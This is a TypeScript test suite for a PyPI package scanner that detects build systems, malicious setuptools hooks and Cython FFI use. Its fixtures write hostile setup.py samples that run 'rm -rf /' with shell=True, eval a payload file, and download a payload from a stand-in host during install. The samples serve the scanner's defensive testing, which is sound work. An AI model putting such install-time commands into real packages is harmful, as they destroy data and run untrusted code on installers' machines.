/**
 * Tests for pypi-sdist-analyzer.ts
 *
 * Covers:
 *  - Build system detection (setuptools / poetry / pdm / flit / hatch / other)
 *  - Malicious setup.py with setuptools hooks detection
 *  - Cython extension detection (.pyx / .pxd files)
 *  - Cython file analysis (system calls, FFI patterns)
 *  - Graceful handling of missing / invalid pyproject.toml
 *  - Packages with no build config at all
 */

import path from "node:path";
import { fileURLToPath } from "node:url";
import os from "node:os";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";

import { describe, expect, it, afterEach, beforeEach } from "vitest";

import {
  analyzePypiBuildSystem,
  analyzeCythonFile,
  analyzeCythonFiles
} from "./pypi-sdist-analyzer";

const fixturesDir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../fixtures");

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

let tempDir: string;

beforeEach(async () => {
  tempDir = await mkdtemp(path.join(os.tmpdir(), "binshield-sdist-test-"));
});

afterEach(async () => {
  await rm(tempDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Build system detection
// ---------------------------------------------------------------------------

describe("analyzePypiBuildSystem — build system detection", () => {
  it("detects setuptools from setup.py with setuptools import", async () => {
    const pkgDir = path.join(tempDir, "pkg-setuptools");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "setup.py"),
      "from setuptools import setup\nsetup(name='test', version='1.0.0')\n"
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    expect(result.buildSystemType).toBe("setuptools");
    expect(result.analyzedFiles).toContain("setup.py");
  });

  it("detects setuptools from setup.cfg [metadata] section", async () => {
    const pkgDir = path.join(tempDir, "pkg-setuptools-cfg");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "setup.cfg"),
      "[metadata]\nname = test\nversion = 1.0.0\n\n[options]\npackages = find:\n"
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    expect(result.buildSystemType).toBe("setuptools");
    expect(result.analyzedFiles).toContain("setup.cfg");
  });

  it("detects poetry from pyproject.toml build-backend", async () => {
    const pkgDir = path.join(tempDir, "pkg-poetry");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "pyproject.toml"),
      '[build-system]\nbuild-backend = "poetry.core.masonry.api"\nrequires = ["poetry-core"]\n'
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    expect(result.buildSystemType).toBe("poetry");
    expect(result.analyzedFiles).toContain("pyproject.toml");
  });

  it("detects pdm from pyproject.toml build-backend", async () => {
    const pkgDir = path.join(tempDir, "pkg-pdm");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "pyproject.toml"),
      '[build-system]\nbuild-backend = "pdm.pep517.api"\nrequires = ["pdm-pep517"]\n'
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    expect(result.buildSystemType).toBe("pdm");
  });

  it("detects flit from pyproject.toml build-backend", async () => {
    const pkgDir = path.join(tempDir, "pkg-flit");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "pyproject.toml"),
      '[build-system]\nbuild-backend = "flit_core.buildapi"\nrequires = ["flit_core"]\n'
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    expect(result.buildSystemType).toBe("flit");
  });

  it("detects hatch from pyproject.toml build-backend", async () => {
    const pkgDir = path.join(tempDir, "pkg-hatch");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "pyproject.toml"),
      '[build-system]\nbuild-backend = "hatchling.build"\nrequires = ["hatchling"]\n'
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    expect(result.buildSystemType).toBe("hatch");
  });

  it("returns 'other' for an unknown build-backend", async () => {
    const pkgDir = path.join(tempDir, "pkg-other");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "pyproject.toml"),
      '[build-system]\nbuild-backend = "maturin"\nrequires = ["maturin"]\n'
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    expect(result.buildSystemType).toBe("other");
  });

  it("returns 'other' for a package with no build config", async () => {
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "pypi-no-build-config")
    );
    expect(result.buildSystemType).toBe("other");
    expect(result.analyzedFiles).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Malicious setuptools hooks detection
// ---------------------------------------------------------------------------

describe("analyzePypiBuildSystem — malicious setuptools hooks", () => {
  it("detects cmdclass overrides in malicious setup.py fixture", async () => {
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "malicious-setuptools-hooks")
    );

    expect(result.analyzedFiles).toContain("setup.py");
    expect(result.buildSystemType).toBe("setuptools");

    // Should detect custom install/build_ext classes
    expect(result.threatDetails.detectedHooks.length).toBeGreaterThan(0);
    const hookDescriptions = result.threatDetails.detectedHooks.join(" ");
    expect(hookDescriptions).toMatch(/install|build_ext|cmdclass/i);
  });

  it("detects shell command execution patterns (subprocess, os.system) in malicious setup.py", async () => {
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "malicious-setuptools-hooks")
    );

    expect(result.threatDetails.suspiciousPatterns.length).toBeGreaterThan(0);

    const patterns = result.threatDetails.suspiciousPatterns.join(" ");
    // Should detect at least one of: subprocess invocation, os.system, eval
    expect(patterns).toMatch(/subprocess|os\.system|eval/i);
  });

  it("detects eval() usage in build config", async () => {
    const pkgDir = path.join(tempDir, "pkg-eval");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "setup.py"),
      "from setuptools import setup\neval(open('payload.py').read())\nsetup(name='test', version='1.0.0')\n"
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    const patterns = result.threatDetails.suspiciousPatterns.join(" ");
    expect(patterns).toMatch(/eval/i);
  });

  it("detects shell=True flag in subprocess call", async () => {
    const pkgDir = path.join(tempDir, "pkg-shell-true");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "setup.py"),
      "import subprocess\nsubprocess.run('rm -rf /', shell=True)\nfrom setuptools import setup\nsetup(name='t', version='1')\n"
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    const patterns = result.threatDetails.suspiciousPatterns.join(" ");
    expect(patterns).toMatch(/shell=True/i);
  });

  it("detects ext_modules declaration (native code compiled at install)", async () => {
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "cython-extension-package")
    );

    const hooks = result.threatDetails.detectedHooks.join(" ");
    expect(hooks).toMatch(/ext_modules/i);
  });

  it("detects network access in build config", async () => {
    const pkgDir = path.join(tempDir, "pkg-network");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "setup.py"),
      "import urllib.request\nurllib.request.urlretrieve('http://evil.example.test/payload', 'payload.py')\nfrom setuptools import setup\nsetup(name='t', version='1')\n"
    );

    const result = await analyzePypiBuildSystem(pkgDir);
    const patterns = result.threatDetails.suspiciousPatterns.join(" ");
    expect(patterns).toMatch(/network/i);
  });
});

// ---------------------------------------------------------------------------
// Cython file detection
// ---------------------------------------------------------------------------

describe("analyzePypiBuildSystem — Cython extension detection", () => {
  it("finds .pyx and .pxd files in cython-extension-package fixture", async () => {
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "cython-extension-package")
    );

    expect(result.threatDetails.cythonFiles.length).toBeGreaterThanOrEqual(2);
    const names = result.threatDetails.cythonFiles.join(" ");
    expect(names).toMatch(/\.pyx/);
    expect(names).toMatch(/\.pxd/);
  });

  it("returns no Cython files for a package with none", async () => {
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "malicious-setup-py")
    );

    expect(result.threatDetails.cythonFiles).toHaveLength(0);
  });

  it("returns no Cython files for a package with no build config", async () => {
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "pypi-no-build-config")
    );

    expect(result.threatDetails.cythonFiles).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Cython file static analysis
// ---------------------------------------------------------------------------

describe("analyzeCythonFile — system call and FFI detection", () => {
  it("detects ctypes CDLL loading in .pyx fixture", async () => {
    const fixtureRoot = path.join(fixturesDir, "cython-extension-package");
    const result = await analyzeCythonFile(fixtureRoot, "cython_ext/fast_math.pyx");

    expect(result.filePath).toBe("cython_ext/fast_math.pyx");
    expect(result.hasFfiUsage).toBe(true);
    expect(result.suspiciousSnippets.length).toBeGreaterThan(0);
  });

  it("detects extern C header import (FFI) in .pyx fixture", async () => {
    const fixtureRoot = path.join(fixturesDir, "cython-extension-package");
    const result = await analyzeCythonFile(fixtureRoot, "cython_ext/fast_math.pyx");

    const snippets = result.suspiciousSnippets.join(" ");
    expect(snippets).toMatch(/extern|ctypes|FFI|ffi/i);
  });

  it("returns empty results for a non-existent file without throwing", async () => {
    const fixtureRoot = path.join(fixturesDir, "cython-extension-package");
    const result = await analyzeCythonFile(fixtureRoot, "nonexistent/file.pyx");

    expect(result.filePath).toBe("nonexistent/file.pyx");
    expect(result.hasSystemCalls).toBe(false);
    expect(result.hasFfiUsage).toBe(false);
    expect(result.suspiciousSnippets).toHaveLength(0);
  });

  it("returns no suspicious snippets for a benign Cython header (.pxd)", async () => {
    const fixtureRoot = path.join(fixturesDir, "cython-extension-package");
    // helpers.pxd only has benign cdef extern declarations for a helper lib
    const result = await analyzeCythonFile(fixtureRoot, "cython_ext/helpers.pxd");

    // The .pxd has cdef extern — that should be detected as FFI
    expect(result.filePath).toBe("cython_ext/helpers.pxd");
    // It may or may not have suspicious snippets depending on fixture content
    // but should not throw and should always return a valid shape
    expect(typeof result.hasSystemCalls).toBe("boolean");
    expect(typeof result.hasFfiUsage).toBe("boolean");
    expect(Array.isArray(result.suspiciousSnippets)).toBe(true);
  });

  it("analyzeCythonFiles processes multiple files and returns one result per file", async () => {
    const fixtureRoot = path.join(fixturesDir, "cython-extension-package");
    const files = ["cython_ext/fast_math.pyx", "cython_ext/helpers.pxd"];
    const results = await analyzeCythonFiles(fixtureRoot, files);

    expect(results).toHaveLength(2);
    expect(results[0].filePath).toBe("cython_ext/fast_math.pyx");
    expect(results[1].filePath).toBe("cython_ext/helpers.pxd");
  });
});

// ---------------------------------------------------------------------------
// Graceful handling of missing / invalid pyproject.toml
// ---------------------------------------------------------------------------

describe("analyzePypiBuildSystem — graceful error handling", () => {
  it("handles invalid/corrupt pyproject.toml without throwing", async () => {
    // The pypi-invalid-pyproject fixture has a setup.py alongside the bad file
    const result = await analyzePypiBuildSystem(
      path.join(fixturesDir, "pypi-invalid-pyproject")
    );

    // Should not throw; should still detect setuptools from setup.py
    expect(result.buildSystemType).toBe("setuptools");
    expect(result.analyzedFiles).toContain("setup.py");
    // The broken pyproject.toml is still read as text (regex-based, not TOML parser)
    expect(result.analyzedFiles).toContain("pyproject.toml");
  });

  it("handles a completely empty package directory without throwing", async () => {
    const emptyDir = path.join(tempDir, "empty-pkg");
    await mkdir(emptyDir, { recursive: true });

    const result = await analyzePypiBuildSystem(emptyDir);

    expect(result.buildSystemType).toBe("other");
    expect(result.analyzedFiles).toHaveLength(0);
    expect(result.threatDetails.detectedHooks).toHaveLength(0);
    expect(result.threatDetails.cythonFiles).toHaveLength(0);
    expect(result.threatDetails.suspiciousPatterns).toHaveLength(0);
  });

  it("handles a package with only conftest.py without throwing", async () => {
    const pkgDir = path.join(tempDir, "pkg-conftest-only");
    await mkdir(pkgDir, { recursive: true });
    await writeFile(
      path.join(pkgDir, "conftest.py"),
      "import pytest\n\n@pytest.fixture\ndef my_fixture():\n    return 42\n"
    );

    const result = await analyzePypiBuildSystem(pkgDir);

    expect(result.buildSystemType).toBe("other");
    expect(result.analyzedFiles).toContain("conftest.py");
    // No threats in a benign conftest
    expect(result.threatDetails.suspiciousPatterns).toHaveLength(0);
  });

  it("handles a package with a very large file gracefully (skips over-size files)", async () => {
    const pkgDir = path.join(tempDir, "pkg-large");
    await mkdir(pkgDir, { recursive: true });
    // Write a file that exceeds the MAX_FILE_BYTES cap (512KB)
    const large = "x".repeat(600 * 1024);
    await writeFile(path.join(pkgDir, "setup.py"), large);

    const result = await analyzePypiBuildSystem(pkgDir);

    // Large file is skipped — falls back to "other"
    expect(result.buildSystemType).toBe("other");
    expect(result.analyzedFiles).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// API endpoint tests for pypi-build-analysis
// ---------------------------------------------------------------------------

import { createApp } from "../../api/src/app";

describe("GET /packages/:ecosystem/:name/:version/pypi-build-analysis", () => {
  const app = createApp();
  const headers = {
    "Content-Type": "application/json",
    "x-binshield-api-key": "binshield-dev-key"
  };

  it("returns 404 for a package analysis that does not exist", async () => {
    const res = await app.request(
      "/packages/pypi/nonexistent-pkg/9.9.9/pypi-build-analysis"
    );
    expect(res.status).toBe(404);
    const body = await res.json();
    expect(body.error).toBeTruthy();
  });

  it("returns structured response for a known npm package (no pypi build data)", async () => {
    // bcrypt is npm — should return empty build details, not 404
    const res = await app.request(
      "/packages/npm/bcrypt/5.1.1/pypi-build-analysis"
    );
    expect(res.status).toBe(200);
    const body = await res.json() as {
      ecosystem: string;
      packageName: string;
      version: string;
      buildSystemType: string;
      pythonBuildThreatDetails: {
        detectedHooks: unknown[];
        cythonFiles: unknown[];
        suspiciousPatterns: unknown[];
      };
    };
    expect(body.ecosystem).toBe("npm");
    expect(body.packageName).toBe("bcrypt");
    expect(body.version).toBe("5.1.1");
    expect(body.buildSystemType).toBe("other");
    expect(Array.isArray(body.pythonBuildThreatDetails.detectedHooks)).toBe(true);
    expect(Array.isArray(body.pythonBuildThreatDetails.cythonFiles)).toBe(true);
    expect(Array.isArray(body.pythonBuildThreatDetails.suspiciousPatterns)).toBe(true);
  });

  it("returns well-shaped response with required fields", async () => {
    const res = await app.request(
      "/packages/npm/bcrypt/5.1.1/pypi-build-analysis"
    );
    expect(res.status).toBe(200);
    const body = await res.json() as Record<string, unknown>;

    // Required fields from spec
    expect(typeof body.buildSystemType).toBe("string");
    expect(typeof body.pythonBuildThreatDetails).toBe("object");
    const details = body.pythonBuildThreatDetails as Record<string, unknown>;
    expect(Array.isArray(details.detectedHooks)).toBe(true);
    expect(Array.isArray(details.cythonFiles)).toBe(true);
    expect(Array.isArray(details.suspiciousPatterns)).toBe(true);
  });
});
